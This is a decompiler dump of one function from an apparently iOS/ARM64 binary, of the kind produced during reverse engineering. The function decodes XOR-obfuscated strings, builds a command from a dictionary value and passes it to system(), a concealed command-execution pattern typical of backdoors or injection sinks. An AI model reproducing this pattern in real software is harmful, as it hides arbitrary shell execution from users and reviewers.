/*
 * func-name: sub_9570
 * func-address: 0x9570
 * export-type: decompile
 * callers: none
 * callees: 0x1b158, 0x51af0, 0x51b08, 0x51b20, 0x51b38, 0x51c58
 */

// positive sp value has been detected, the output may be wrong!
void sub_9570()
{
  void *v0; // x19
  unsigned int *v1; // x20
  id v2; // x19
  NSString *v3; // x20
  NSString *v4; // x19

  asc_70B34[0] = ~byte_70B30 & 0xE8 | byte_70B30 & 0x17;
  asc_70B34[1] = ~byte_70B31 & 0xC5 | byte_70B31 & 0x3A;
  asc_70B34[2] = (~byte_70B32 & 0x1D | byte_70B32 & 0xE2) ^ 0xF2;
  asc_70B34[3] = byte_70B33 ^ 0xC2;
  a4N[0] = ~(byte_70B10 & 0x4F | ~byte_70B10 & 0xB0);
  a4N[1] = byte_70B11 ^ 0x90;
  a4N[2] = byte_70B12 ^ 0xC9;
  a4N[3] = byte_70B13 - 2 * (byte_70B13 & 0x12) - 110;
  a4N[4] = byte_70B14 ^ 0x4C;
  a4N[5] = byte_70B15 ^ 0x70;
  a4N[6] = byte_70B16 ^ 0xEA;
  a4N[7] = byte_70B17 ^ 0xE2;
  a4N[8] = byte_70B18 ^ 0x16;
  a4N[9] = (~byte_70B19 & 0xBE | byte_70B19 & 0x41) ^ 0x4A;
  a4N[10] = (~byte_70B1A | 0xD3) & (byte_70B1A | 0x2C);
  a4N[11] = byte_70B1B ^ 0x6F;
  a4N[12] = (~byte_70B1C & 0x67 | byte_70B1C & 0x98) ^ 0x9A;
  a4N[13] = ~(byte_70B1D & 0xF0 | ~byte_70B1D & 0xF);
  a4N[14] = ~((byte_70B1E | 0x76) & (~byte_70B1E | 0x89));
  a4N[15] = byte_70B1F ^ 0x9B;
  nullsub_1(off_72908);
  atomic_store(1u, v1);
  v2 = objc_retainAutoreleasedReturnValue(objc_msgSend(v0, "objectForKeyedSubscript:", CFSTR("\xF9")));
  v3 = objc_retainAutoreleasedReturnValue(
         +[NSString stringWithFormat:](
           &OBJC_CLASS___NSString,
           "stringWithFormat:",
           CFSTR("4,N\xE9\x2A\xEF\r\xD8\x35k\xB5D\x15\xA1U\f"),
           v2));
  objc_release(v2);
  v4 = objc_retainAutorelease(v3);
  system(-[NSString UTF8String](v4, "UTF8String"));
  objc_release(v4);
}
